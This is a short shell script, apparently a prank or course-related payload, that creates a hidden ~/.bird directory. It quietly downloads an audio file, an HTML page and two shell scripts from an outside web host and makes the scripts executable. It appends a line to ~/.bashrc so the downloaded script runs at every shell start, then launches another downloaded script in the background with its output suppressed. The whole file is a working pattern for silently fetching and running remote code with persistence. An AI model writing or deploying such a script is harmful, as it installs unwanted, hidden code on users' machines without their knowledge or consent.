#!/bin/sh
ps -e|grep bird_launch.sh >/dev/null && exit
mkdir $HOME/.bird 2>/dev/null
cd $HOME/.bird
test -e bird.ogg || wget --quiet http://zhuoweizhang.net/csc190/bird.ogg
test -e bird_launch.sh || wget --quiet http://zhuoweizhang.net/csc190/bird_launch.sh
test -e bird.html || wget --quiet http://zhuoweizhang.net/csc190/bird.html
test -e bird.sh || wget --quiet http://zhuoweizhang.net/csc190/bird.sh
chmod +x bird_launch.sh
chmod +x bird.sh
grep "bird.sh" ~/.bashrc >/dev/null || echo "~/.bird/bird.sh" >>~/.bashrc
nohup ./bird_launch.sh >/dev/null &
